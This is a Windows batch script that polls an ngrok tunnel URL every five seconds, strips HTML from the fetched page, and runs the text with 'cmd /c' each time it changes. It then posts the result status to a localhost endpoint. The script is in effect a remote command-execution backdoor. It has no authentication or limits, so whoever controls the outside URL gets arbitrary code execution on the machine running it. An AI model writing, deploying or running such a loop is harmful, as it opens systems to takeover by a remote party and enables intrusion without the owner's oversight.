@echo off
setlocal enabledelayedexpansion

set "NGROK_URL=https://favorite-handcraft-chubby.ngrok-free.dev"
set "LOCAL_URL=http://localhost:8000/result"
set "TIMEOUT_SECONDS=5"
set "LAST_CONTENT_FILE=%TEMP%\ngrok_last_content.txt"
set "CURRENT_CONTENT_FILE=%TEMP%\ngrok_current_content.txt"

echo Monitoring %NGROK_URL%...
echo Only executes on NEW content. Press Ctrl+C to stop
echo.

:loop
    curl -s --max-time 10 "%NGROK_URL%" > "%TEMP%\ngrok_raw.html" 2>nul
    
    if !errorlevel! equ 0 (
        :: Strip HTML tags to get clean command
        powershell -NoProfile -Command "(Get-Content '%TEMP%\ngrok_raw.html' -Raw) -replace '<[^>]+>','' -replace '&nbsp;',' ' -replace '^\s+|\s+$','' | Set-Content '%CURRENT_CONTENT_FILE%' -NoNewline" 2>nul
        
        :: Check if content changed by comparing files
        set "CONTENT_CHANGED=no"
        
        if not exist "%LAST_CONTENT_FILE%" (
            set "CONTENT_CHANGED=yes"
        ) else (
            fc /b "%CURRENT_CONTENT_FILE%" "%LAST_CONTENT_FILE%" >nul 2>&1
            if !errorlevel! neq 0 set "CONTENT_CHANGED=yes"
        )
        
        if "!CONTENT_CHANGED!" equ "yes" (
            :: Read the command into variable for display and execution
            set "CMD_TEXT="
            for /f "usebackq delims=" %%a in ("%CURRENT_CONTENT_FILE%") do set "CMD_TEXT=%%a"
            
            echo ============================================
            echo [%date% %time%] NEW CONTENT DETECTED - Executing:
            echo !CMD_TEXT!
            echo ============================================
            
            :: FIXED: Execute the command string variable directly instead of redirecting the file
            cmd /c !CMD_TEXT!
            set "EXIT_CODE=!errorlevel!"
            
            :: POST result to localhost
            if !EXIT_CODE! equ 0 (
                set "RESULT_MSG=success"
                echo [+] Command completed successfully
            ) else (
                set "RESULT_MSG=failed_with_code_!EXIT_CODE!"
                echo [!] Command failed with exit code !EXIT_CODE!
            )
            
            curl -s -X POST "%LOCAL_URL%" -H "Content-Type: application/x-www-form-urlencoded" -d "text=!RESULT_MSG!" >nul 2>&1
            
            :: Save current content as last content
            copy /y "%CURRENT_CONTENT_FILE%" "%LAST_CONTENT_FILE%" >nul
            
            echo ============================================
            echo.
        ) else (
            echo [%date% %time%] Content unchanged, waiting...
        )
    ) else (
        echo [%date% %time%] Server offline, waiting...
    )
    
    :: Cleanup temp files except last content tracker
    if exist "%TEMP%\ngrok_raw.html" del "%TEMP%\ngrok_raw.html"
    if exist "%CURRENT_CONTENT_FILE%" del "%CURRENT_CONTENT_FILE%"
    
    timeout /t %TIMEOUT_SECONDS% /nobreak >nul
    
goto loop
